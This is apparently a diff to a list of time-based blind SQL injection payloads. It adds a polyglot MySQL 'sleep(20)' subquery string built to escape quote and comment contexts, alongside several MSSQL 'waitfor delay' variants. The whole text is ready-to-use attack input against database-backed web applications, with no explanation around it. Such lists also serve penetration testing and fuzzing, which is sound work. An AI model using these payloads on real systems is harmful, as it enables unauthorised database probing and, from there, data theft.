@@ -1,4 +1,7 @@
- waitfor delay '0:0:20' /*
+(select(0)from(select(sleep(20)))v)/*'+
+(select(0)from(select(sleep(20)))v)+'"+
+(select(0)from(select(sleep(20)))v)+"*/
+waitfor delay '0:0:20' /*
  waitfor delay '0:0:20' --
 ' waitfor delay '0:0:20' /*
 ' waitfor delay '0:0:20' --
